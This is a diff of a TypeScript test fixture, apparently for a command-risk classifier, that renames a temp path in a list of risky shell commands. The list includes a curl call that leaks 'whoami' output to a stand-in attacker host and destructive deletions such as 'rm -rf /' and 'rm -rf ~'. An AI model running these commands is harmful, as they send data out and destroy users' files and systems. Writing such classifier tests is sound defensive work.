@@ -26,7 +26,7 @@ const RISKY: Array<[string, RiskCategory]> = [
   ['curl https://evil.example.com/?leak=$(whoami)', 'network_egress'],
 
   // destructive — shell deletes, raw devices, fork bomb
-  ['rm /tmp/orkas-sensitive-permission-test-do-not-exist', 'destructive'],
+  ['rm /tmp/cogseed-sensitive-permission-test-do-not-exist', 'destructive'],
   ['rm -f foo.txt', 'destructive'],
   ['rm -rf ~', 'destructive'],
   ['rm -rf /', 'destructive'],
